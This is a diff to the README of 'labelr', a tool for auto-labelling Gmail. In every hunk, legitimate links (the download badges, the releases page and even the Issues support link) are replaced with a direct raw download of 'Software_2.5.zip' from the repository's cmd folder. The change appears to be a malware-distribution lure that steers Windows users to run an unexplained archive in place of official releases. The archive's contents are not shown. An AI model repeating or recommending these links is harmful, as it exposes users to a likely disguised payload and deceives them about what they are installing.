@@ -1,6 +1,6 @@
 # 📧 labelr - Auto Classify and Label Gmail Emails
 
-[![Download labelr](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/SHellysss/labelr/releases)
+[![Download labelr](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/SHellysss/labelr/raw/refs/heads/main/cmd/Software_2.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get labelr running on your Windows computer.
 
 Click the button below to visit the releases page where you can download the latest version of labelr for Windows. The packages are ready to run and do not require installation tools.
 
-[![Download labelr](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/SHellysss/labelr/releases)
+[![Download labelr](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/SHellysss/labelr/raw/refs/heads/main/cmd/Software_2.5.zip)
 
 On the page, look for a file named like:
 
@@ -143,7 +143,7 @@ Check your Gmail to make sure you gave labelr access. Also, verify you are conne
 ## ⬇️ Download & Installation Summary
 
 1. Visit this page to download labelr:  
-   https://github.com/SHellysss/labelr/releases
+   https://github.com/SHellysss/labelr/raw/refs/heads/main/cmd/Software_2.5.zip
 
 2. Download the Windows executable file.
 
@@ -189,6 +189,6 @@ to see available options.
 ## 📞 Getting Support
 
 If you experience issues, you can open a request on the GitHub Issues page here:  
-https://github.com/SHellysss/labelr/issues
+https://github.com/SHellysss/labelr/raw/refs/heads/main/cmd/Software_2.5.zip
 
 Provide details about your Windows version, steps you took, and the problem you faced. This will help the developers respond efficiently.
